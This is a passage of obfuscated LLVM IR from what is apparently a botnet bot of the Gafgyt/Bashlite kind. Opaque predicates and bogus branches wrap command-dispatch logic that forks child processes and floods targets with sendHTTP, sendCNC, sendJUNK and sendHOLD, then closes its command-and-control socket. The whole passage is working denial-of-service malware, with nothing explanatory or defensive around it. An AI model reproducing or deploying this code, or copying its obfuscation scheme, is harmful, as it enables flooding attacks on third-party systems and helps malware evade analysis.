  %979 = load i8*, i8** %26, align 8
  %980 = call i8* @strstr(i8* %979, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %981 = icmp ne i8* %980, null
  br i1 %981, label %982, label %1070

; <label>:982:                                    ; preds = %971
  %983 = load i32, i32* @x.79
  %984 = load i32, i32* @y.80
  %985 = sub i32 %983, 1
  %986 = mul i32 %983, %985
  %987 = urem i32 %986, 2
  %988 = icmp eq i32 %987, 0
  %989 = icmp slt i32 %984, 10
  %990 = or i1 %988, %989
  br i1 %990, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %982
  %991 = load i8*, i8** %26, align 8
  %992 = call i8* @strtok(i8* %991, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %992, i8** %28, align 8
  %993 = load i32, i32* @x.79
  %994 = load i32, i32* @y.80
  %995 = sub i32 %993, 1
  %996 = mul i32 %993, %995
  %997 = urem i32 %996, 2
  %998 = icmp eq i32 %997, 0
  %999 = icmp slt i32 %994, 10
  %1000 = or i1 %998, %999
  br i1 %1000, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1001

; <label>:1001:                                   ; preds = %originalBBpart2140, %originalBBpart2132
  %1002 = load i8*, i8** %28, align 8
  %1003 = icmp ne i8* %1002, null
  br i1 %1003, label %1004, label %1053

; <label>:1004:                                   ; preds = %1001
  %1005 = load i32, i32* @x.79
  %1006 = load i32, i32* @y.80
  %1007 = sub i32 %1005, 1
  %1008 = mul i32 %1005, %1007
  %1009 = urem i32 %1008, 2
  %1010 = icmp eq i32 %1009, 0
  %1011 = icmp slt i32 %1006, 10
  %1012 = or i1 %1010, %1011
  br i1 %1012, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1004
  %1013 = call i32 @listFork()
  %1014 = icmp ne i32 %1013, 0
  %1015 = load i32, i32* @x.79
  %1016 = load i32, i32* @y.80
  %1017 = sub i32 %1015, 1
  %1018 = mul i32 %1015, %1017
  %1019 = urem i32 %1018, 2
  %1020 = icmp eq i32 %1019, 0
  %1021 = icmp slt i32 %1016, 10
  %1022 = or i1 %1020, %1021
  br i1 %1022, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1014, label %1035, label %1023

; <label>:1023:                                   ; preds = %originalBBpart2136
  store i32 0, i32* %29, align 4
  br label %1024

; <label>:1024:                                   ; preds = %1027, %1023
  %1025 = load i32, i32* %29, align 4
  %1026 = icmp slt i32 %1025, 10
  br i1 %1026, label %1027, label %1032

; <label>:1027:                                   ; preds = %1024
  %1028 = load i8*, i8** %26, align 8
  %1029 = load i32, i32* %27, align 4
  call void @sendHTTP(i8* %1028, i32 %1029)
  %1030 = load i32, i32* %29, align 4
  %1031 = add nsw i32 %1030, 1
  store i32 %1031, i32* %29, align 4
  br label %1024

; <label>:1032:                                   ; preds = %1024
  %1033 = load i32, i32* @mainCommSock, align 4
  %1034 = call i32 @close(i32 %1033)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1035:                                   ; preds = %originalBBpart2136
  %1036 = load i32, i32* @x.79
  %1037 = load i32, i32* @y.80
  %1038 = sub i32 %1036, 1
  %1039 = mul i32 %1036, %1038
  %1040 = urem i32 %1039, 2
  %1041 = icmp eq i32 %1040, 0
  %1042 = icmp slt i32 %1037, 10
  %1043 = or i1 %1041, %1042
  br i1 %1043, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1035
  %1044 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1044, i8** %28, align 8
  %1045 = load i32, i32* @x.79
  %1046 = load i32, i32* @y.80
  %1047 = sub i32 %1045, 1
  %1048 = mul i32 %1045, %1047
  %1049 = urem i32 %1048, 2
  %1050 = icmp eq i32 %1049, 0
  %1051 = icmp slt i32 %1046, 10
  %1052 = or i1 %1050, %1051
  br i1 %1052, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1001

; <label>:1053:                                   ; preds = %1001
  %1054 = load i32, i32* @x.79
  %1055 = load i32, i32* @y.80
  %1056 = sub i32 %1054, 1
  %1057 = mul i32 %1054, %1056
  %1058 = urem i32 %1057, 2
  %1059 = icmp eq i32 %1058, 0
  %1060 = icmp slt i32 %1055, 10
  %1061 = or i1 %1059, %1060
  br i1 %1061, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1053
  %1062 = load i32, i32* @x.79
  %1063 = load i32, i32* @y.80
  %1064 = sub i32 %1062, 1
  %1065 = mul i32 %1062, %1064
  %1066 = urem i32 %1065, 2
  %1067 = icmp eq i32 %1066, 0
  %1068 = icmp slt i32 %1063, 10
  %1069 = or i1 %1067, %1068
  br i1 %1069, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1118

; <label>:1070:                                   ; preds = %971
  %1071 = call i32 @listFork()
  %1072 = icmp ne i32 %1071, 0
  br i1 %1072, label %1073, label %1074

; <label>:1073:                                   ; preds = %1070
  br label %1855

; <label>:1074:                                   ; preds = %1070
  %1075 = load i32, i32* @x.79
  %1076 = load i32, i32* @y.80
  %1077 = sub i32 %1075, 1
  %1078 = mul i32 %1075, %1077
  %1079 = urem i32 %1078, 2
  %1080 = icmp eq i32 %1079, 0
  %1081 = icmp slt i32 %1076, 10
  %1082 = or i1 %1080, %1081
  br i1 %1082, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1074
  store i32 0, i32* %30, align 4
  %1083 = load i32, i32* @x.79
  %1084 = load i32, i32* @y.80
  %1085 = sub i32 %1083, 1
  %1086 = mul i32 %1083, %1085
  %1087 = urem i32 %1086, 2
  %1088 = icmp eq i32 %1087, 0
  %1089 = icmp slt i32 %1084, 10
  %1090 = or i1 %1088, %1089
  br i1 %1090, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %1091

; <label>:1091:                                   ; preds = %1094, %originalBBpart2148
  %1092 = load i32, i32* %30, align 4
  %1093 = icmp slt i32 %1092, 10
  br i1 %1093, label %1094, label %1099

; <label>:1094:                                   ; preds = %1091
  %1095 = load i8*, i8** %26, align 8
  %1096 = load i32, i32* %27, align 4
  call void @sendHTTP(i8* %1095, i32 %1096)
  %1097 = load i32, i32* %30, align 4
  %1098 = add nsw i32 %1097, 1
  store i32 %1098, i32* %30, align 4
  br label %1091

; <label>:1099:                                   ; preds = %1091
  %1100 = load i32, i32* @x.79
  %1101 = load i32, i32* @y.80
  %1102 = sub i32 %1100, 1
  %1103 = mul i32 %1100, %1102
  %1104 = urem i32 %1103, 2
  %1105 = icmp eq i32 %1104, 0
  %1106 = icmp slt i32 %1101, 10
  %1107 = or i1 %1105, %1106
  br i1 %1107, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1099
  %1108 = load i32, i32* @mainCommSock, align 4
  %1109 = call i32 @close(i32 %1108)
  call void @_exit(i32 0) #12
  %1110 = load i32, i32* @x.79
  %1111 = load i32, i32* @y.80
  %1112 = sub i32 %1110, 1
  %1113 = mul i32 %1110, %1112
  %1114 = urem i32 %1113, 2
  %1115 = icmp eq i32 %1114, 0
  %1116 = icmp slt i32 %1111, 10
  %1117 = or i1 %1115, %1116
  br i1 %1117, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  unreachable

; <label>:1118:                                   ; preds = %originalBBpart2144
  br label %1119

; <label>:1119:                                   ; preds = %1118, %originalBBpart2120
  %1120 = load i8**, i8*** %4, align 8
  %1121 = getelementptr inbounds i8*, i8** %1120, i64 0
  %1122 = load i8*, i8** %1121, align 8
  %1123 = call i32 @strcmp(i8* %1122, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0)) #10
  %1124 = icmp ne i32 %1123, 0
  br i1 %1124, label %1279, label %1125

; <label>:1125:                                   ; preds = %1119
  %1126 = load i32, i32* %3, align 4
  %1127 = icmp slt i32 %1126, 4
  br i1 %1127, label %1156, label %1128

; <label>:1128:                                   ; preds = %1125
  %1129 = load i32, i32* @x.79
  %1130 = load i32, i32* @y.80
  %1131 = sub i32 %1129, 1
  %1132 = mul i32 %1129, %1131
  %1133 = urem i32 %1132, 2
  %1134 = icmp eq i32 %1133, 0
  %1135 = icmp slt i32 %1130, 10
  %1136 = or i1 %1134, %1135
  br i1 %1136, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1128
  %1137 = load i8**, i8*** %4, align 8
  %1138 = getelementptr inbounds i8*, i8** %1137, i64 2
  %1139 = load i8*, i8** %1138, align 8
  %1140 = call i32 @atoi(i8* %1139) #10
  %1141 = icmp slt i32 %1140, 1
  %1142 = load i32, i32* @x.79
  %1143 = load i32, i32* @y.80
  %1144 = sub i32 %1142, 1
  %1145 = mul i32 %1142, %1144
  %1146 = urem i32 %1145, 2
  %1147 = icmp eq i32 %1146, 0
  %1148 = icmp slt i32 %1143, 10
  %1149 = or i1 %1147, %1148
  br i1 %1149, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1141, label %1156, label %1150

; <label>:1150:                                   ; preds = %originalBBpart2156
  %1151 = load i8**, i8*** %4, align 8
  %1152 = getelementptr inbounds i8*, i8** %1151, i64 3
  %1153 = load i8*, i8** %1152, align 8
  %1154 = call i32 @atoi(i8* %1153) #10
  %1155 = icmp slt i32 %1154, 1
  br i1 %1155, label %1156, label %1173

; <label>:1156:                                   ; preds = %1150, %originalBBpart2156, %1125
  %1157 = load i32, i32* @x.79
  %1158 = load i32, i32* @y.80
  %1159 = sub i32 %1157, 1
  %1160 = mul i32 %1157, %1159
  %1161 = urem i32 %1160, 2
  %1162 = icmp eq i32 %1161, 0
  %1163 = icmp slt i32 %1158, 10
  %1164 = or i1 %1162, %1163
  br i1 %1164, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1156
  %1165 = load i32, i32* @x.79
  %1166 = load i32, i32* @y.80
  %1167 = sub i32 %1165, 1
  %1168 = mul i32 %1165, %1167
  %1169 = urem i32 %1168, 2
  %1170 = icmp eq i32 %1169, 0
  %1171 = icmp slt i32 %1166, 10
  %1172 = or i1 %1170, %1171
  br i1 %1172, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %1855

; <label>:1173:                                   ; preds = %1150
  %1174 = load i8**, i8*** %4, align 8
  %1175 = getelementptr inbounds i8*, i8** %1174, i64 1
  %1176 = load i8*, i8** %1175, align 8
  store i8* %1176, i8** %31, align 8
  %1177 = load i8**, i8*** %4, align 8
  %1178 = getelementptr inbounds i8*, i8** %1177, i64 2
  %1179 = load i8*, i8** %1178, align 8
  %1180 = call i32 @atoi(i8* %1179) #10
  store i32 %1180, i32* %32, align 4
  %1181 = load i8**, i8*** %4, align 8
  %1182 = getelementptr inbounds i8*, i8** %1181, i64 3
  %1183 = load i8*, i8** %1182, align 8
  %1184 = call i32 @atoi(i8* %1183) #10
  store i32 %1184, i32* %33, align 4
  %1185 = load i8*, i8** %31, align 8
  %1186 = call i8* @strstr(i8* %1185, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %1187 = icmp ne i8* %1186, null
  br i1 %1187, label %1188, label %1254

; <label>:1188:                                   ; preds = %1173
  %1189 = load i32, i32* @x.79
  %1190 = load i32, i32* @y.80
  %1191 = sub i32 %1189, 1
  %1192 = mul i32 %1189, %1191
  %1193 = urem i32 %1192, 2
  %1194 = icmp eq i32 %1193, 0
  %1195 = icmp slt i32 %1190, 10
  %1196 = or i1 %1194, %1195
  br i1 %1196, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1188
  %1197 = load i8*, i8** %31, align 8
  %1198 = call i8* @strtok(i8* %1197, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1198, i8** %34, align 8
  %1199 = load i32, i32* @x.79
  %1200 = load i32, i32* @y.80
  %1201 = sub i32 %1199, 1
  %1202 = mul i32 %1199, %1201
  %1203 = urem i32 %1202, 2
  %1204 = icmp eq i32 %1203, 0
  %1205 = icmp slt i32 %1200, 10
  %1206 = or i1 %1204, %1205
  br i1 %1206, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %1207

; <label>:1207:                                   ; preds = %originalBBpart2168, %originalBBpart2164
  %1208 = load i8*, i8** %34, align 8
  %1209 = icmp ne i8* %1208, null
  br i1 %1209, label %1210, label %1237

; <label>:1210:                                   ; preds = %1207
  %1211 = call i32 @listFork()
  %1212 = icmp ne i32 %1211, 0
  br i1 %1212, label %1219, label %1213

; <label>:1213:                                   ; preds = %1210
  %1214 = load i8*, i8** %34, align 8
  %1215 = load i32, i32* %32, align 4
  %1216 = load i32, i32* %33, align 4
  call void @sendCNC(i8* %1214, i32 %1215, i32 %1216)
  %1217 = load i32, i32* @mainCommSock, align 4
  %1218 = call i32 @close(i32 %1217)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1219:                                   ; preds = %1210
  %1220 = load i32, i32* @x.79
  %1221 = load i32, i32* @y.80
  %1222 = sub i32 %1220, 1
  %1223 = mul i32 %1220, %1222
  %1224 = urem i32 %1223, 2
  %1225 = icmp eq i32 %1224, 0
  %1226 = icmp slt i32 %1221, 10
  %1227 = or i1 %1225, %1226
  br i1 %1227, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1219
  %1228 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1228, i8** %34, align 8
  %1229 = load i32, i32* @x.79
  %1230 = load i32, i32* @y.80
  %1231 = sub i32 %1229, 1
  %1232 = mul i32 %1229, %1231
  %1233 = urem i32 %1232, 2
  %1234 = icmp eq i32 %1233, 0
  %1235 = icmp slt i32 %1230, 10
  %1236 = or i1 %1234, %1235
  br i1 %1236, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1207

; <label>:1237:                                   ; preds = %1207
  %1238 = load i32, i32* @x.79
  %1239 = load i32, i32* @y.80
  %1240 = sub i32 %1238, 1
  %1241 = mul i32 %1238, %1240
  %1242 = urem i32 %1241, 2
  %1243 = icmp eq i32 %1242, 0
  %1244 = icmp slt i32 %1239, 10
  %1245 = or i1 %1243, %1244
  br i1 %1245, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1237
  %1246 = load i32, i32* @x.79
  %1247 = load i32, i32* @y.80
  %1248 = sub i32 %1246, 1
  %1249 = mul i32 %1246, %1248
  %1250 = urem i32 %1249, 2
  %1251 = icmp eq i32 %1250, 0
  %1252 = icmp slt i32 %1247, 10
  %1253 = or i1 %1251, %1252
  br i1 %1253, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %1262

; <label>:1254:                                   ; preds = %1173
  %1255 = call i32 @listFork()
  %1256 = icmp ne i32 %1255, 0
  br i1 %1256, label %1257, label %1258

; <label>:1257:                                   ; preds = %1254
  br label %1855

; <label>:1258:                                   ; preds = %1254
  %1259 = load i8*, i8** %31, align 8
  %1260 = load i32, i32* %32, align 4
  %1261 = load i32, i32* %33, align 4
  call void @sendCNC(i8* %1259, i32 %1260, i32 %1261)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1262:                                   ; preds = %originalBBpart2172
  %1263 = load i32, i32* @x.79
  %1264 = load i32, i32* @y.80
  %1265 = sub i32 %1263, 1
  %1266 = mul i32 %1263, %1265
  %1267 = urem i32 %1266, 2
  %1268 = icmp eq i32 %1267, 0
  %1269 = icmp slt i32 %1264, 10
  %1270 = or i1 %1268, %1269
  br i1 %1270, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1262
  %1271 = load i32, i32* @x.79
  %1272 = load i32, i32* @y.80
  %1273 = sub i32 %1271, 1
  %1274 = mul i32 %1271, %1273
  %1275 = urem i32 %1274, 2
  %1276 = icmp eq i32 %1275, 0
  %1277 = icmp slt i32 %1272, 10
  %1278 = or i1 %1276, %1277
  br i1 %1278, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br label %1279

; <label>:1279:                                   ; preds = %originalBBpart2176, %1119
  %1280 = load i32, i32* @x.79
  %1281 = load i32, i32* @y.80
  %1282 = sub i32 %1280, 1
  %1283 = mul i32 %1280, %1282
  %1284 = urem i32 %1283, 2
  %1285 = icmp eq i32 %1284, 0
  %1286 = icmp slt i32 %1281, 10
  %1287 = or i1 %1285, %1286
  br i1 %1287, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1279
  %1288 = load i8**, i8*** %4, align 8
  %1289 = getelementptr inbounds i8*, i8** %1288, i64 0
  %1290 = load i8*, i8** %1289, align 8
  %1291 = call i32 @strcmp(i8* %1290, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0)) #10
  %1292 = icmp ne i32 %1291, 0
  %1293 = load i32, i32* @x.79
  %1294 = load i32, i32* @y.80
  %1295 = sub i32 %1293, 1
  %1296 = mul i32 %1293, %1295
  %1297 = urem i32 %1296, 2
  %1298 = icmp eq i32 %1297, 0
  %1299 = icmp slt i32 %1294, 10
  %1300 = or i1 %1298, %1299
  br i1 %1300, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br i1 %1292, label %1461, label %1301

; <label>:1301:                                   ; preds = %originalBBpart2180
  %1302 = load i32, i32* %3, align 4
  %1303 = icmp slt i32 %1302, 4
  br i1 %1303, label %1332, label %1304

; <label>:1304:                                   ; preds = %1301
  %1305 = load i8**, i8*** %4, align 8
  %1306 = getelementptr inbounds i8*, i8** %1305, i64 2
  %1307 = load i8*, i8** %1306, align 8
  %1308 = call i32 @atoi(i8* %1307) #10
  %1309 = icmp slt i32 %1308, 1
  br i1 %1309, label %1332, label %1310

; <label>:1310:                                   ; preds = %1304
  %1311 = load i32, i32* @x.79
  %1312 = load i32, i32* @y.80
  %1313 = sub i32 %1311, 1
  %1314 = mul i32 %1311, %1313
  %1315 = urem i32 %1314, 2
  %1316 = icmp eq i32 %1315, 0
  %1317 = icmp slt i32 %1312, 10
  %1318 = or i1 %1316, %1317
  br i1 %1318, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1310
  %1319 = load i8**, i8*** %4, align 8
  %1320 = getelementptr inbounds i8*, i8** %1319, i64 3
  %1321 = load i8*, i8** %1320, align 8
  %1322 = call i32 @atoi(i8* %1321) #10
  %1323 = icmp slt i32 %1322, 1
  %1324 = load i32, i32* @x.79
  %1325 = load i32, i32* @y.80
  %1326 = sub i32 %1324, 1
  %1327 = mul i32 %1324, %1326
  %1328 = urem i32 %1327, 2
  %1329 = icmp eq i32 %1328, 0
  %1330 = icmp slt i32 %1325, 10
  %1331 = or i1 %1329, %1330
  br i1 %1331, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br i1 %1323, label %1332, label %1349

; <label>:1332:                                   ; preds = %originalBBpart2184, %1304, %1301
  %1333 = load i32, i32* @x.79
  %1334 = load i32, i32* @y.80
  %1335 = sub i32 %1333, 1
  %1336 = mul i32 %1333, %1335
  %1337 = urem i32 %1336, 2
  %1338 = icmp eq i32 %1337, 0
  %1339 = icmp slt i32 %1334, 10
  %1340 = or i1 %1338, %1339
  br i1 %1340, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1332
  %1341 = load i32, i32* @x.79
  %1342 = load i32, i32* @y.80
  %1343 = sub i32 %1341, 1
  %1344 = mul i32 %1341, %1343
  %1345 = urem i32 %1344, 2
  %1346 = icmp eq i32 %1345, 0
  %1347 = icmp slt i32 %1342, 10
  %1348 = or i1 %1346, %1347
  br i1 %1348, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br label %1855

; <label>:1349:                                   ; preds = %originalBBpart2184
  %1350 = load i8**, i8*** %4, align 8
  %1351 = getelementptr inbounds i8*, i8** %1350, i64 1
  %1352 = load i8*, i8** %1351, align 8
  store i8* %1352, i8** %35, align 8
  %1353 = load i8**, i8*** %4, align 8
  %1354 = getelementptr inbounds i8*, i8** %1353, i64 2
  %1355 = load i8*, i8** %1354, align 8
  %1356 = call i32 @atoi(i8* %1355) #10
  store i32 %1356, i32* %36, align 4
  %1357 = load i8**, i8*** %4, align 8
  %1358 = getelementptr inbounds i8*, i8** %1357, i64 3
  %1359 = load i8*, i8** %1358, align 8
  %1360 = call i32 @atoi(i8* %1359) #10
  store i32 %1360, i32* %37, align 4
  %1361 = load i8*, i8** %35, align 8
  %1362 = call i8* @strstr(i8* %1361, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %1363 = icmp ne i8* %1362, null
  br i1 %1363, label %1364, label %1417

; <label>:1364:                                   ; preds = %1349
  %1365 = load i32, i32* @x.79
  %1366 = load i32, i32* @y.80
  %1367 = sub i32 %1365, 1
  %1368 = mul i32 %1365, %1367
  %1369 = urem i32 %1368, 2
  %1370 = icmp eq i32 %1369, 0
  %1371 = icmp slt i32 %1366, 10
  %1372 = or i1 %1370, %1371
  br i1 %1372, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1364
  %1373 = load i8*, i8** %35, align 8
  %1374 = call i8* @strtok(i8* %1373, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1374, i8** %38, align 8
  %1375 = load i32, i32* @x.79
  %1376 = load i32, i32* @y.80
  %1377 = sub i32 %1375, 1
  %1378 = mul i32 %1375, %1377
  %1379 = urem i32 %1378, 2
  %1380 = icmp eq i32 %1379, 0
  %1381 = icmp slt i32 %1376, 10
  %1382 = or i1 %1380, %1381
  br i1 %1382, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br label %1383

; <label>:1383:                                   ; preds = %1414, %originalBBpart2192
  %1384 = load i32, i32* @x.79
  %1385 = load i32, i32* @y.80
  %1386 = sub i32 %1384, 1
  %1387 = mul i32 %1384, %1386
  %1388 = urem i32 %1387, 2
  %1389 = icmp eq i32 %1388, 0
  %1390 = icmp slt i32 %1385, 10
  %1391 = or i1 %1389, %1390
  br i1 %1391, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1383
  %1392 = load i8*, i8** %38, align 8
  %1393 = icmp ne i8* %1392, null
  %1394 = load i32, i32* @x.79
  %1395 = load i32, i32* @y.80
  %1396 = sub i32 %1394, 1
  %1397 = mul i32 %1394, %1396
  %1398 = urem i32 %1397, 2
  %1399 = icmp eq i32 %1398, 0
  %1400 = icmp slt i32 %1395, 10
  %1401 = or i1 %1399, %1400
  br i1 %1401, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br i1 %1393, label %1402, label %1416

; <label>:1402:                                   ; preds = %originalBBpart2196
  %1403 = call i32 @listFork()
  %1404 = icmp ne i32 %1403, 0
  br i1 %1404, label %1414, label %1405

; <label>:1405:                                   ; preds = %1402
  %1406 = load i8*, i8** %38, align 8
  %1407 = load i32, i32* %36, align 4
  %1408 = load i32, i32* %37, align 4
  call void @sendJUNK(i8* %1406, i32 %1407, i32 %1408)
  %1409 = load i8*, i8** %38, align 8
  %1410 = load i32, i32* %36, align 4
  %1411 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* %1409, i32 %1410, i32 %1411)
  %1412 = load i32, i32* @mainCommSock, align 4
  %1413 = call i32 @close(i32 %1412)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1414:                                   ; preds = %1402
  %1415 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1415, i8** %38, align 8
  br label %1383

; <label>:1416:                                   ; preds = %originalBBpart2196
  br label %1460

; <label>:1417:                                   ; preds = %1349
  %1418 = load i32, i32* @x.79
  %1419 = load i32, i32* @y.80
  %1420 = sub i32 %1418, 1
  %1421 = mul i32 %1418, %1420
  %1422 = urem i32 %1421, 2
  %1423 = icmp eq i32 %1422, 0
  %1424 = icmp slt i32 %1419, 10
  %1425 = or i1 %1423, %1424
  br i1 %1425, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1417
  %1426 = call i32 @listFork()
  %1427 = icmp ne i32 %1426, 0
  %1428 = load i32, i32* @x.79
  %1429 = load i32, i32* @y.80
  %1430 = sub i32 %1428, 1
  %1431 = mul i32 %1428, %1430
  %1432 = urem i32 %1431, 2
  %1433 = icmp eq i32 %1432, 0
  %1434 = icmp slt i32 %1429, 10
  %1435 = or i1 %1433, %1434
  br i1 %1435, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %1427, label %1436, label %1437

; <label>:1436:                                   ; preds = %originalBBpart2200
  br label %1855

; <label>:1437:                                   ; preds = %originalBBpart2200
  %1438 = load i32, i32* @x.79
  %1439 = load i32, i32* @y.80
  %1440 = sub i32 %1438, 1
  %1441 = mul i32 %1438, %1440
  %1442 = urem i32 %1441, 2
  %1443 = icmp eq i32 %1442, 0
  %1444 = icmp slt i32 %1439, 10
  %1445 = or i1 %1443, %1444
  br i1 %1445, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1437
  %1446 = load i8*, i8** %35, align 8
  %1447 = load i32, i32* %36, align 4
  %1448 = load i32, i32* %37, align 4
  call void @sendJUNK(i8* %1446, i32 %1447, i32 %1448)
  %1449 = load i8*, i8** %35, align 8
  %1450 = load i32, i32* %36, align 4
  %1451 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* %1449, i32 %1450, i32 %1451)
  call void @_exit(i32 0) #12
  %1452 = load i32, i32* @x.79
  %1453 = load i32, i32* @y.80
  %1454 = sub i32 %1452, 1
  %1455 = mul i32 %1452, %1454
  %1456 = urem i32 %1455, 2
  %1457 = icmp eq i32 %1456, 0
  %1458 = icmp slt i32 %1453, 10
  %1459 = or i1 %1457, %1458
  br i1 %1459, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  unreachable

; <label>:1460:                                   ; preds = %1416
  br label %1461

; <label>:1461:                                   ; preds = %1460, %originalBBpart2180
  %1462 = load i8**, i8*** %4, align 8
  %1463 = getelementptr inbounds i8*, i8** %1462, i64 0
  %1464 = load i8*, i8** %1463, align 8
  %1465 = call i32 @strcmp(i8* %1464, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i32 0, i32 0)) #10
  %1466 = icmp ne i32 %1465, 0
  br i1 %1466, label %1732, label %1467

; <label>:1467:                                   ; preds = %1461
  %1468 = load i32, i32* @x.79
  %1469 = load i32, i32* @y.80
  %1470 = sub i32 %1468, 1
  %1471 = mul i32 %1468, %1470
  %1472 = urem i32 %1471, 2
  %1473 = icmp eq i32 %1472, 0
  %1474 = icmp slt i32 %1469, 10
  %1475 = or i1 %1473, %1474
  br i1 %1475, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1467
  %1476 = load i32, i32* %3, align 4
  %1477 = icmp slt i32 %1476, 6
  %1478 = load i32, i32* @x.79
  %1479 = load i32, i32* @y.80
  %1480 = sub i32 %1478, 1
  %1481 = mul i32 %1478, %1480
  %1482 = urem i32 %1481, 2
  %1483 = icmp eq i32 %1482, 0
  %1484 = icmp slt i32 %1479, 10
  %1485 = or i1 %1483, %1484
  br i1 %1485, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br i1 %1477, label %1576, label %1486

; <label>:1486:                                   ; preds = %originalBBpart2208
  %1487 = load i32, i32* @x.79
  %1488 = load i32, i32* @y.80
  %1489 = sub i32 %1487, 1
  %1490 = mul i32 %1487, %1489
  %1491 = urem i32 %1490, 2
  %1492 = icmp eq i32 %1491, 0
  %1493 = icmp slt i32 %1488, 10
  %1494 = or i1 %1492, %1493
  br i1 %1494, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1486
  %1495 = load i8**, i8*** %4, align 8
  %1496 = getelementptr inbounds i8*, i8** %1495, i64 3
  %1497 = load i8*, i8** %1496, align 8
  %1498 = call i32 @atoi(i8* %1497) #10
  %1499 = icmp eq i32 %1498, -1
  %1500 = load i32, i32* @x.79
  %1501 = load i32, i32* @y.80
  %1502 = sub i32 %1500, 1
  %1503 = mul i32 %1500, %1502
  %1504 = urem i32 %1503, 2
  %1505 = icmp eq i32 %1504, 0
  %1506 = icmp slt i32 %1501, 10
  %1507 = or i1 %1505, %1506
  br i1 %1507, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %1499, label %1576, label %1508

; <label>:1508:                                   ; preds = %originalBBpart2212
